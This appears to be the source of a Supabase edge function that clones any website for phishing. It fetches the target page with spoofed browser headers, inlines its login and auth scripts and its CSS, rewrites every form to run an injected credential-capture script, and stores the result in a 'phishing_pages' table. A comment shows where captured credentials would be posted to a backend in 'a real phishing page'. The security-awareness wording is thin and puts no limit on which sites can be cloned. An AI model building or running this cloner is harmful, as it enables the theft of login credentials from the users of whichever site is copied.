
// Follow this setup guide to integrate the Deno language server with your editor:
// https://deno.land/manual/getting_started/setup_your_environment
// This enables autocomplete, go to definition, etc.

import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
import { DOMParser } from "https://deno.land/x/deno_dom@v0.1.38/deno-dom-wasm.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? '',
      {
        global: {
          headers: { Authorization: req.headers.get('Authorization')! },
        },
      }
    );

    // Get the request body
    const { url, name, category } = await req.json();

    if (!url) {
      return new Response(
        JSON.stringify({ error: 'URL is required' }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        }
      );
    }

    console.log(`Attempting to clone website: ${url}`);

    // Try to fetch the target website with enhanced browser-like headers
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Ch-Ua': '"Chromium";v="115", "Not/A)Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
      },
    }).catch(error => {
      console.error(`Fetch error: ${error.message}`);
      throw new Error(`Failed to fetch website: ${error.message}`);
    });

    if (!response.ok) {
      console.error(`Failed to fetch website with status: ${response.status} ${response.statusText}`);
      return new Response(
        JSON.stringify({ error: `Failed to fetch website: ${response.statusText} (${response.status})` }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 502,
        }
      );
    }

    // Get the content type and HTML content
    const contentType = response.headers.get('content-type') || '';
    if (!contentType.includes('text/html')) {
      console.error(`Unsupported content type: ${contentType}`);
      return new Response(
        JSON.stringify({ error: `Unsupported content type: ${contentType}. Only HTML pages can be cloned.` }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 415,
        }
      );
    }

    // Get the HTML content
    let htmlContent = await response.text();
    
    // Extract base URL for handling relative URLs
    const baseUrl = new URL(url).origin;
    const urlPath = new URL(url).pathname;
    const basePath = urlPath.substring(0, urlPath.lastIndexOf('/') + 1);
    
    // Parse the HTML to extract resources
    let cssContent = '';
    let jsContent = '';

    try {
      const document = new DOMParser().parseFromString(htmlContent, "text/html");
      if (!document) {
        throw new Error("Failed to parse HTML document");
      }
      
      // Get base tag if it exists
      let baseHref = baseUrl;
      const baseTag = document.querySelector("base[href]");
      if (baseTag && baseTag.getAttribute("href")) {
        try {
          baseHref = new URL(baseTag.getAttribute("href") || "", baseUrl).href;
        } catch (error) {
          console.error("Invalid base href:", error);
        }
      }
      
      // Process and update all <form> elements to capture credentials
      const forms = document.querySelectorAll("form");
      if (forms && forms.length > 0) {
        for (let i = 0; i < forms.length; i++) {
          forms[i].setAttribute("onsubmit", "captureCredentials(event); return false;");
        }
      }
      
      // Add credential capture script to HTML
      const credentialScript = `
        <script>
          function captureCredentials(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            const data = {};
            formData.forEach((value, key) => {
              data[key] = value;
            });
            
            // Log credentials (this would actually send to your backend in a real scenario)
            console.log('Captured credentials:', data);
            alert('Login attempt recorded. This was a security awareness test.');
            
            // In a real phishing page, you would send this data to your backend
            // fetch('/api/store-credentials', {
            //   method: 'POST',
            //   headers: { 'Content-Type': 'application/json' },
            //   body: JSON.stringify(data)
            // });
            
            return false;
          }
        </script>
      `;
      
      // Extract all external CSS
      const externalStyles = document.querySelectorAll("link[rel='stylesheet']");
      if (externalStyles && externalStyles.length > 0) {
        for (let i = 0; i < externalStyles.length; i++) {
          const href = externalStyles[i].getAttribute("href");
          if (href) {
            try {
              // Convert relative URLs to absolute
              let cssUrl = href;
              if (href.startsWith('/')) {
                cssUrl = baseUrl + href;
              } else if (!href.startsWith('http')) {
                cssUrl = new URL(href, baseHref).href;
              }
              
              console.log(`Fetching CSS: ${cssUrl}`);
              const cssResponse = await fetch(cssUrl, {
                headers: {
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                  'Referer': url,
                }
              }).catch(e => {
                console.error(`Error fetching CSS ${cssUrl}:`, e);
                return null;
              });
              
              if (cssResponse && cssResponse.ok) {
                const css = await cssResponse.text();
                cssContent += `/* From ${cssUrl} */\n${css}\n\n`;
                
                // Update the href to be inline in the cloned page
                externalStyles[i].setAttribute("href", "");
                externalStyles[i].setAttribute("data-original-href", href);
              } else {
                console.log(`Failed to fetch CSS: ${cssUrl}, status: ${cssResponse?.status}`);
              }
            } catch (error) {
              console.error("Error processing CSS:", error);
            }
          }
        }
      }

      // Extract all inline styles
      const styleElements = document.querySelectorAll("style");
      if (styleElements && styleElements.length > 0) {
        for (let i = 0; i < styleElements.length; i++) {
          const styleContent = styleElements[i].textContent || "";
          cssContent += `/* Inline style ${i + 1} */\n${styleContent}\n\n`;
        }
      }

      // Extract essential external JavaScript (avoid loading too many scripts)
      const externalScripts = document.querySelectorAll("script[src]");
      const essentialScriptPatterns = [/jquery/i, /login/i, /auth/i, /validation/i, /form/i];
      
      if (externalScripts && externalScripts.length > 0) {
        for (let i = 0; i < externalScripts.length; i++) {
          const src = externalScripts[i].getAttribute("src");
          if (src) {
            // Only fetch scripts that match essential patterns to avoid loading too much JS
            const isEssential = essentialScriptPatterns.some(pattern => pattern.test(src));
            if (isEssential) {
              try {
                // Convert relative URLs to absolute
                let jsUrl = src;
                if (src.startsWith('/')) {
                  jsUrl = baseUrl + src;
                } else if (!src.startsWith('http')) {
                  jsUrl = new URL(src, baseHref).href;
                }
                
                console.log(`Fetching JS: ${jsUrl}`);
                const jsResponse = await fetch(jsUrl, {
                  headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'Referer': url,
                  }
                }).catch(e => {
                  console.error(`Error fetching JS ${jsUrl}:`, e);
                  return null;
                });
                
                if (jsResponse && jsResponse.ok) {
                  const js = await jsResponse.text();
                  jsContent += `/* From ${jsUrl} */\n${js}\n\n`;
                } else {
                  console.log(`Failed to fetch JS: ${jsUrl}, status: ${jsResponse?.status}`);
                }
              } catch (error) {
                console.error("Error processing JS:", error);
              }
            } else {
              console.log(`Skipping non-essential script: ${src}`);
            }
          }
        }
      }

      // Extract all inline scripts
      const scriptElements = document.querySelectorAll("script:not([src])");
      if (scriptElements && scriptElements.length > 0) {
        for (let i = 0; i < scriptElements.length; i++) {
          const scriptContent = scriptElements[i].textContent || "";
          if (scriptContent.trim()) {
            jsContent += `/* Inline script ${i + 1} */\n${scriptContent}\n\n`;
          }
        }
      }
      
      // Inject credential capture script
      jsContent += credentialScript;
      
      // Update HTML with the serialized document
      htmlContent = document.documentElement.outerHTML;
    } catch (error) {
      console.error("Error using DOM parser:", error);
      // Continue with backup method
    }

    // Backup: Process HTML with regex if DOM parsing failed
    if (!cssContent && !jsContent) {
      console.log("Using backup regex method for HTML processing");
      
      // Backup: Extract inline styles
      const styleMatches = htmlContent.match(/<style[^>]*>([\s\S]*?)<\/style>/gi);
      if (styleMatches) {
        cssContent = styleMatches.map(match => {
          const content = match.replace(/<style[^>]*>|<\/style>/gi, '');
          return content;
        }).join('\n');
      }

      // Backup: Extract inline scripts
      const scriptMatches = htmlContent.match(/<script[^>]*>([\s\S]*?)<\/script>/gi);
      if (scriptMatches) {
        jsContent = scriptMatches.map(match => {
          if (!match.includes('src=')) {
            const content = match.replace(/<script[^>]*>|<\/script>/gi, '');
            return content;
          }
          return '';
        }).filter(Boolean).join('\n');
      }
      
      // Add form capture for backup method
      const formCapture = `
      <script>
        document.addEventListener('DOMContentLoaded', function() {
          const forms = document.querySelectorAll('form');
          forms.forEach(form => {
            form.addEventListener('submit', function(e) {
              e.preventDefault();
              const formData = new FormData(form);
              const data = {};
              formData.forEach((value, key) => {
                data[key] = value;
              });
              console.log('Captured credentials:', data);
              alert('Login attempt recorded. This was a security awareness test.');
              return false;
            });
          });
        });
      </script>`;
      
      // Add credential capture script for backup method
      jsContent += formCapture;
    }

    // Process the HTML to handle relative URLs
    let processedHtml = htmlContent;
    try {
      // Convert relative URLs in href and src attributes to absolute
      processedHtml = processedHtml.replace(/\s(href|src)=["'](?!http|https|\/\/|#|javascript|data:)([^"']+)["']/gi, (match, attr, path) => {
        try {
          let absoluteUrl;
          if (path.startsWith('/')) {
            absoluteUrl = baseUrl + path;
          } else {
            absoluteUrl = baseUrl + (basePath + path).replace(/\/\.\//, '/').replace(/\/[^\/]+\/\.\.\//, '/');
          }
          return ` ${attr}="${absoluteUrl}"`;
        } catch (e) {
          console.error("Error converting URL:", e);
          return match; // Keep original if conversion fails
        }
      });
      
      // Add base tag if it doesn't exist
      if (!processedHtml.includes('<base ')) {
        processedHtml = processedHtml.replace(/<head>/i, `<head>\n<base href="${baseUrl}/">`);
      }
      
      // Inject our CSS override to ensure form inputs are visible
      const cssOverride = `
      <style id="phishing-override">
        /* Ensure inputs are visible */
        input, select, textarea, button {
          display: inline-block !important;
          visibility: visible !important;
          opacity: 1 !important;
        }
        /* Make sure forms are visible */
        form {
          display: block !important;
          visibility: visible !important;
          opacity: 1 !important;
        }
      </style>
      `;
      
      processedHtml = processedHtml.replace(/<\/head>/i, `${cssOverride}\n</head>`);
      
    } catch (error) {
      console.error("Error processing HTML URLs:", error);
    }

    // Save to database
    const pageName = name || new URL(url).hostname;
    
    console.log(`Saving cloned page: ${pageName} from ${url}`);
    
    const { data, error } = await supabaseClient
      .from('phishing_pages')
      .insert([
        {
          name: pageName,
          category: category || 'Cloned',
          source_url: url,
          html_content: processedHtml,
          css_content: cssContent,
          js_content: jsContent,
          is_custom: false,
        },
      ])
      .select()
      .single();

    if (error) {
      console.error('Error saving page:', error);
      return new Response(
        JSON.stringify({ error: error.message }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        }
      );
    }

    console.log('Successfully cloned and saved page with ID:', data.id);
    
    return new Response(
      JSON.stringify({ success: true, data }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    );
  } catch (error) {
    console.error('Unexpected error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    
    return new Response(
      JSON.stringify({ error: errorMessage }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    );
  }
})
